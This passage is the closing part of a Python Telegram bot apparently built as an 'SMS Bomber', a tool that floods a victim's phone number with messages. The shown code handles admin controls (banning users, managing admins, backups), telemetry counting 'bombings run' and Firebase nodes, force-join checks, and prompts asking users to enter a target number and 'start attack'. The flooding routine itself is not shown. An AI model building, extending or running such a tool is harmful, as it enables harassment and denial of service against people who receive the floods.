    await state.set_state(Form.schedule_name)
    await cq.message.edit_text(sc("🚫 ʙᴀɴ ᴜꜱᴇʀ\n\nꜱᴇɴᴅ ᴜꜱᴇʀ ɪᴅ ᴛᴏ ʙᴀɴ:\n\n<i>ꜱᴇɴᴅ /cancel ᴛᴏ ᴀʙᴏʀᴛ</i>"), parse_mode="HTML", reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "admin:panel")]]))

@R.message(Form.schedule_name)
async def process_ban(msg: types.Message, state: FSMContext):
    try:
        uid = int(msg.text.strip())
        d = load()
        if uid not in d.get("banned", []):
            d["banned"].append(uid)
            save(d)
            await state.clear()
            await msg.answer(f"{sc('🚫 ᴜꜱᴇʀ ʙᴀɴɴᴇᴅ!')}\n\n👤 <code>{uid}</code>", parse_mode="HTML", reply_markup=admin_panel_kb(d))
        else:
            await msg.answer(sc("❌ ᴜꜱᴇʀ ɪꜱ ᴀʟʀᴇᴀᴅʏ ʙᴀɴɴᴇᴅ!"))
    except:
        await msg.answer(sc("❌ ɪɴᴠᴀʟɪᴅ ᴜꜱᴇʀ ɪᴅ!"))

@R.callback_query(F.data == "admin:unban")
async def cb_unban(cq: types.CallbackQuery):
    d = load()
    banned = d.get("banned", [])
    if not banned:
        await cq.answer(sc("✅ ɴᴏ ʙᴀɴɴᴇᴅ ᴜꜱᴇʀꜱ!"), show_alert=True)
        return
    rows = [[(f"🔓 {sc('ᴜɴʙᴀɴ')} {uid}", f"admin:unban_do:{uid}") for uid in banned]]
    rows.append([("◀️ " + sc("ʙᴀᴄᴋ"), "admin:panel")])
    await cq.message.edit_text(sc("✅ ᴜɴʙᴀɴ ᴜꜱᴇʀ\n\nᴛᴀᴘ ᴛᴏ ᴜɴʙᴀɴ:"), reply_markup=kb(rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("admin:unban_do:"))
async def cb_unban_do(cq: types.CallbackQuery):
    uid = int(cq.data.split(":")[2])
    d = load()
    if uid in d.get("banned", []):
        d["banned"].remove(uid)
        save(d)
        await cq.answer(f"✅ {uid} {sc('ᴜɴʙᴀɴɴᴇᴅ!')}", show_alert=True)
        await cb_unban(cq)

# ════════════════════════════════════════════════════════════
# ADMIN PANEL - ADMINS
# ════════════════════════════════════════════════════════════
@R.callback_query(F.data == "admin:admins")
async def cb_admins(cq: types.CallbackQuery):
    d = load()
    admins = d.get("admins", [OWNER_ID])
    text = styled_box("ᴀᴅᴍɪɴ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ", "\n".join([f"👑 <code>{aid}</code> (Owner)" if aid == OWNER_ID else f"👤 <code>{aid}</code>" for aid in admins]))
    rows = [[(f"🗑 {sc('ʀᴇᴍᴏᴠᴇ')} {aid}", f"admin:admin_del:{aid}") for aid in admins if aid != OWNER_ID]]
    rows.append([("➕ " + sc("ᴀᴅᴅ ᴀᴅᴍɪɴ"), "admin:admin_add")])
    rows.append([("◀️ " + sc("ʙᴀᴄᴋ"), "admin:panel")])
    await cq.message.edit_text(text, reply_markup=kb(rows), parse_mode="HTML")

@R.callback_query(F.data == "admin:admin_add")
async def cb_admin_add(cq: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.bomb_number)
    await cq.message.edit_text(sc("➕ ᴀᴅᴅ ᴀᴅᴍɪɴ\n\nꜱᴇɴᴅ ᴛᴇʟᴇɢʀᴀᴍ ᴜꜱᴇʀ ɪᴅ:\n\n<i>ꜱᴇɴᴅ /cancel ᴛᴏ ᴀʙᴏʀᴛ</i>"), parse_mode="HTML", reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "admin:panel")]]))

@R.message(Form.bomb_number)
async def process_admin_add(msg: types.Message, state: FSMContext):
    try:
        admin_id = int(msg.text.strip())
        d = load()
        if admin_id not in d.get("admins", []):
            d["admins"].append(admin_id)
            save(d)
            await state.clear()
            await msg.answer(f"{sc('✅ ᴀᴅᴍɪɴ ᴀᴅᴅᴇᴅ!')}\n\n👤 <code>{admin_id}</code>", parse_mode="HTML", reply_markup=admin_panel_kb(d))
        else:
             await msg.answer(sc("❌ ᴜꜱᴇʀ ɪꜱ ᴀʟʀᴇᴀᴅʏ ᴀɴ ᴀᴅᴍɪɴ!"))
    except:
        await msg.answer(sc("❌ ɪɴᴠᴀʟɪᴅ ᴜꜱᴇʀ ɪᴅ!"))

@R.callback_query(F.data.startswith("admin:admin_del:"))
async def cb_admin_del(cq: types.CallbackQuery):
    admin_id = int(cq.data.split(":")[2])
    if admin_id == OWNER_ID:
        await cq.answer(sc("❌ ᴄᴀɴ'ᴛ ʀᴇᴍᴏᴠᴇ ᴏᴡɴᴇʀ!"), show_alert=True)
        return
    d = load()
    if admin_id in d.get("admins", []):
        d["admins"].remove(admin_id)
        save(d)
        await cq.answer(sc("🗑 ʀᴇᴍᴏᴠᴇᴅ!"), show_alert=True)
        await cb_admins(cq)

# ════════════════════════════════════════════════════════════
# ADMIN PANEL - BACKUP/RESTORE
# ════════════════════════════════════════════════════════════
@R.callback_query(F.data == "admin:backup")
async def cb_backup(cq: types.CallbackQuery):
    d = load()
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_file = f"backup_{timestamp}.json"
    with open(backup_file, "w") as f:
        json.dump(d, f, indent=2)
    doc = FSInputFile(backup_file)
    await cq.message.answer_document(doc, caption=sc("💾 ᴅᴀᴛᴀʙᴀꜱᴇ ʙᴀᴄᴋᴜᴘ"))
    os.remove(backup_file)

@R.callback_query(F.data == "admin:restore")
async def cb_restore(cq: types.CallbackQuery):
    await cq.answer(sc("📂 ꜱᴇɴᴅ ʙᴀᴄᴋᴜᴘ ꜰɪʟᴇ ᴀꜱ ᴅᴏᴄᴜᴍᴇɴᴛ"), show_alert=True)

# ════════════════════════════════════════════════════════════
# ADMIN PANEL - STATS
# ════════════════════════════════════════════════════════════
@R.callback_query(F.data == "admin:stats")
async def cb_admin_stats(cq: types.CallbackQuery):
    d = load()
    stats = d.get("stats", {"total_sent": 0, "total_failed": 0, "total_bombings": 0})
    total = stats.get("total_sent", 0) + stats.get("total_failed", 0)
    rate = round(stats.get("total_sent", 0) / total * 100, 1) if total > 0 else 0
    text = styled_box("ɢʟᴏʙᴀʟ ᴛᴇʟᴇᴍᴇᴛʀʏ",
        f"🔥 {sc('ɴᴏᴅᴇꜱ')}: <b>{len(d.get('firebases', []))}</b>\n"
        f"📅 {sc('ꜱᴄʜᴇᴅᴜʟᴇꜱ')}: <b>{len(d.get('schedules', []))}</b>\n"
        f"👥 {sc('ᴀᴅᴍɪɴꜱ')}: <b>{len(d.get('admins', []))}</b>\n"
        f"🚫 {sc('ʙᴀɴɴᴇᴅ')}: <b>{len(d.get('banned', []))}</b>\n\n"
        f"✅ {sc('ᴛᴏᴛᴀʟ ꜱᴇɴᴛ')}: <b>{stats.get('total_sent', 0)}</b>\n"
        f"❌ {sc('ᴛᴏᴛᴀʟ ꜰᴀɪʟᴇᴅ')}: <b>{stats.get('total_failed', 0)}</b>\n"
        f"💣 {sc('ʙᴏᴍʙɪɴɢꜱ ʀᴜɴ')}: <b>{stats.get('total_bombings', 0)}</b>\n"
        f"📈 {sc('ꜱᴜᴄᴄᴇꜱꜱ ʀᴀᴛᴇ')}: <b>{rate}%</b>")
    await cq.message.edit_text(text, reply_markup=back_button("admin:panel"), parse_mode="HTML")

# ════════════════════════════════════════════════════════════
# ADMIN MAIN PANEL
# ════════════════════════════════════════════════════════════
@R.callback_query(F.data == "admin:panel")
async def cb_admin_panel(cq: types.CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer(sc("🚫 ᴀᴅᴍɪɴ ᴏɴʟʏ!"), show_alert=True)
        return
    await state.clear()
    await cq.message.edit_text(styled_box("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", f"👑 {sc('ᴡᴇʟᴄᴏᴍᴇ ᴀᴅᴍɪɴ')}\n\n{sc('ᴛᴀᴘ ᴀ ʙᴜᴛᴛᴏɴ ᴛᴏ ᴘʀᴏᴄᴇᴇᴅ')}\n\n📊 {sc('ᴠᴇʀꜱɪᴏɴ')}: {VERSION}"), parse_mode="HTML", reply_markup=admin_panel_kb(d))

# ════════════════════════════════════════════════════════════
# FORCE JOIN VERIFICATION
# ════════════════════════════════════════════════════════════
@R.callback_query(F.data == "fj_verify")
async def cb_fj_verify(cq: types.CallbackQuery):
    uid = cq.from_user.id
    d = load()
    if await check_fj(cq.bot, uid, FORCE_JOIN_CHANNELS):
        if is_admin(uid, d):
            await cq.message.edit_text(styled_box("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", f"👑 {sc('ᴡᴇʟᴄᴏᴍᴇ ᴀᴅᴍɪɴ')}\n\n{sc('ᴛᴀᴘ ᴀ ʙᴜᴛᴛᴏɴ ᴛᴏ ᴘʀᴏᴄᴇᴇᴅ')}\n\n📊 {sc('ᴠᴇʀꜱɪᴏɴ')}: {VERSION}"), parse_mode="HTML", reply_markup=admin_panel_kb(d))
        else:
            text = styled_box("ꜱᴍꜱ ʙᴏᴍʙᴇʀ", f"🎯 {sc('ᴇɴᴛᴇʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ')}\n\n<i>{sc('ᴘʀɪᴠᴀᴛᴇ ᴍᴇꜱꜱᴀɢᴇ ᴀɴᴅ ꜱᴛᴀʀᴛ ᴀᴛᴛᴀᴄᴋ')}</i>")
            await cq.message.edit_text(text, parse_mode="HTML", reply_markup=kb([[("🚀 " + sc("ꜱᴛᴀʀᴛ ʙᴏᴍʙɪɴɢ"), "start_bomb")]]​))
    else:
        await send_fj_ui(cq, FORCE_JOIN_CHANNELS)

# ════════════════════════════════════════════════════════════
# CLOSE BUTTON
# ════════════════════════════════════════════════════════════
@R.callback_query(F.data == "close")
async def cb_close(cq: types.CallbackQuery):
    await cq.message.delete()

# ════════════════════════════════════════════════════════════
# CANCEL COMMAND
# ════════════════════════════════════════════════════════════
@R.message(Command("cancel"))
async def cmd_cancel(msg: types.Message, state: FSMContext):
    await state.clear()
    d = load()
    if is_admin(msg.from_user.id, d):
        await msg.answer(styled_box("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", f"👑 {sc('ᴡᴇʟᴄᴏᴍᴇ ᴀᴅᴍɪɴ')}\n\n{sc('ᴛᴀᴘ ᴀ ʙᴜᴛᴛᴏɴ ᴛᴏ ᴘʀᴏᴄᴇᴇᴅ')}\n\n📊 {sc('ᴠᴇʀꜱɪᴏɴ')}: {VERSION}"), parse_mode="HTML", reply_markup=admin_panel_kb(d))
    else:
        text = styled_box("ꜱᴍꜱ ʙᴏᴍʙᴇʀ", f"🎯 {sc('ᴇɴᴛᴇʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ')}\n\n<i>{sc('ᴘʀɪᴠᴀᴛᴇ ᴍᴇꜱꜱᴀɢᴇ ᴀɴᴅ ꜱᴛᴀʀᴛ ᴀᴛᴛᴀᴄᴋ')}</i>")
        await msg.answer(text, parse_mode="HTML", reply_markup=kb([[("🚀 " + sc("ꜱᴛᴀʀᴛ ʙᴏᴍʙɪɴɢ"), "start_bomb")]]))

# ════════════════════════════════════════════════════════════
# MAIN
# ════════════════════════════════════════════════════════════
async def main():
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    me = await bot.get_me()
    log.info(f"✅ @{me.username} started ({VERSION})")
    await start_scheduler(bot)
    try:
        await bot.send_message(OWNER_ID, f"🚀 {sc('ꜱᴍꜱ ʙᴏᴍʙᴇʀ')} {VERSION} {sc('ᴏɴʟɪɴᴇ')}\n@{me.username}\n\n📅 {sc('ꜱᴄʜᴇᴅᴜʟᴇʀ')}: ✅ {sc('ʀᴜɴɴɪɴɢ')}")
    except: pass
    try:
        await dp.start_polling(bot)
    finally:
        await stop_scheduler()

if __name__ == "__main__":
    asyncio.run(main())
